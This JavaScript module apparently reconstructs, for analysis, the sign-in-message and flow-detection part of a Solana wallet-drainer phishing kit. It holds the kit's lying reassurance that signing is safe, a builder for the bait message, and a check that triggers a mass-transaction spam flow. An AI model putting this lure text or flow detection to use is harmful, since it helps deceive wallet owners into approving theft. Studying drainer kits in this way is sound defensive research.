'use strict';
/**
 * Sign-In-With-Solana (SIWS) message builder and flow detection.
 * Sources: decompiled/kit/page/siws.js, bundle.deobfuscated.js
 *
 * SIWS flow (FLOW.SIWS = 1) triggers when the operator config pushes
 * flowModifier = 1 in the /c/i response. The victim signs a text
 * message instead of a transaction as a "verify ownership" step.
 * After SIWS, the kit proceeds to the main drain (FLOW.DRAIN = 0).
 *
 * 200-tx flood (FLOW.SPAM = 2) triggers when canSignAll() is true.
 * The kit builds ~201 near-empty transactions and mass-presents them.
 */

// String table [360-362]
const SIWS_LINE1  = ' wants you to sign in with your Solana account';
const SIWS_BODY   =
  '\n\nWelcome to our DApp. Signing is the only way we can truly know' +
  ' that you are the owner of the wallet you are connecting.' +
  ' Signing is a safe, gas-less transaction that does not in any way' +
  ' give us permission to perform any transactions with your wallet.' +
  '\n\nURI: https://';
const SIWS_TAIL   = '/login\nVersion: 1\nNonce: ';

/**
 * buildSiwsMessage(host, walletAddress):
 *   EIP-4361 / CAIP-122 Solana message.
 *   The nonce is 16 hex chars (8 random bytes).
 */
function buildSiwsMessage(host, walletAddress) {
  const nonce = _randomHex(8);
  return host + SIWS_LINE1 + '\n' + walletAddress + SIWS_BODY + host + SIWS_TAIL + nonce;
}

function _randomHex(byteCount) {
  const b = new Uint8Array(byteCount);
  crypto.getRandomValues(b);
  return Array.from(b, x => x.toString(16).padStart(2, '0')).join('');
}

/**
 * canSignAll(wallet):
 *   True if the wallet supports signAllTransactions.
 *   Triggers the 200-tx spam flow (FLOW.SPAM = 2).
 *   Checks wallet-standard feature "solana:signAllTransactions" [754]
 *   and legacy window.solana injection.
 */
function canSignAll(wallet) {
  if (wallet?.features?.['solana:signAllTransactions']) return true;
  if (typeof window !== 'undefined') {
    if (typeof window.solana?.signAllTransactions === 'function') return true;
  }
  return false;
}

/**
 * siwsConfirmCopy():
 *   The UI copy shown above the SIWS message dialog.
 *   String table [1014]: "Confirm that you're the owner of this account"
 */
function siwsConfirmCopy() {
  return "Confirm that you're the owner of this account";
}

module.exports = { buildSiwsMessage, canSignAll, siwsConfirmCopy };
